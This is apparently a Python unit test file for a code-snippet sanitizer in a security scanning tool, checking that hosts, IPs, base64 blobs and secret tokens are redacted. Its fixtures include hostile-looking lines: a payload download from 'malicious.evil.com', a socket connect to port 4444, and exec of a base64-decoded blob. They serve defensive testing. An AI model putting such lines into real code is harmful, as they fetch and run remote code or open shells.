"""Unit tests for snippet and replay sanitizer (Day 4 step 4.4)."""
import unittest

from spider.engine.sanitize import sanitize_snippet, sanitize_scan_record_for_replay


class SanitizerTests(unittest.TestCase):
    def test_url_and_ip_redaction(self):
        s1 = "requests.get('http://malicious.evil.com/payload')\n"
        out1 = sanitize_snippet(s1)
        self.assertNotIn("malicious.evil.com", out1)
        self.assertIn("<redacted-host>", out1)

        s2 = "s = socket.connect(('192.168.1.100', 4444))\n"
        out2 = sanitize_snippet(s2)
        self.assertNotIn("192.168.1.100", out2)
        self.assertIn("<redacted-host>", out2)

    def test_base64_blob_redaction(self):
        blob = "a" * 50
        s = f"blob = '{blob}'\nexec(base64.b64decode(blob))\n"
        out = sanitize_snippet(s)
        self.assertNotIn(blob, out)
        self.assertIn("<redacted-blob>", out)

        # Short base64 below 40 chars not redacted
        short = "a" * 20
        s_short = f"short = '{short}'\n"
        out_short = sanitize_snippet(s_short)
        self.assertIn(short, out_short)

    def test_token_redaction(self):
        aws = "aws_key = 'AKIAIOSFODNN7EXAMPLE'\n"
        out_aws = sanitize_snippet(aws)
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", out_aws)
        self.assertIn("<redacted-token>", out_aws)

        gh = "token = 'ghp_123456789012345678901234567890123456'\n"
        out_gh = sanitize_snippet(gh)
        self.assertNotIn("ghp_123456789012345678901234567890123456", out_gh)
        self.assertIn("<redacted-token>", out_gh)

    def test_line_length_and_line_count_caps(self):
        # Long line
        long_line = "x = " + "1" * 200 + "\n"
        out_long = sanitize_snippet(long_line)
        self.assertLessEqual(len(out_long.splitlines()[0]), 120)

        # Many lines
        many_lines = "\n".join(f"line_{i} = {i}" for i in range(20))
        out_lines = sanitize_snippet(many_lines)
        self.assertLessEqual(len(out_lines.splitlines()), 8)

    def test_sanitize_scan_record_replay_origin(self):
        fake_rec = {
            "record_origin": "analyzer",
            "target": {"kind": "directory"},
            "findings": [
                {
                    "snippet": "connect('10.0.0.1')",
                    "file": "a.py",
                }
            ],
        }
        res = sanitize_scan_record_for_replay(fake_rec)
        self.assertEqual(res["record_origin"], "replay")
        self.assertEqual(res["target"]["kind"], "archive")
        self.assertIn("<redacted-host>", res["findings"][0]["snippet"])


if __name__ == "__main__":
    unittest.main()

